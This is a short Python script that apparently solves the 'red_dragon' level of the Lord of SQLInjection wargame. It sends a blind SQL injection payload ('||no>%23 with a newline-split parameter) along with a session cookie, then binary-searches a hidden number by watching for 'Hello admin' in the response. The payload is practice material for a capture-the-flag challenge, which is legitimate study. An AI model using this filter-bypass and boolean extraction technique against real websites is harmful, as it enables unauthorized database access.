import requests
url = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
cookies = {'PHPSESSID': 'i03snlmnog6a9dj1rct4p2b96i'}

start = 500000000
end = 600000000

mid = int((start+end)/2)
print(mid)
while(start-end):
    query = url+"?id='||no>%23&no=%0a"+str(mid)
    response = requests.get(query, cookies=cookies)
    html_data = response.text
    print(response.url)
    if("Hello admin" in html_data):
        start = mid
        mid = int((start+end)/2)
    else:
        end = mid
        mid = int((start+end)/2) 
print(mid)

# solved : 586482014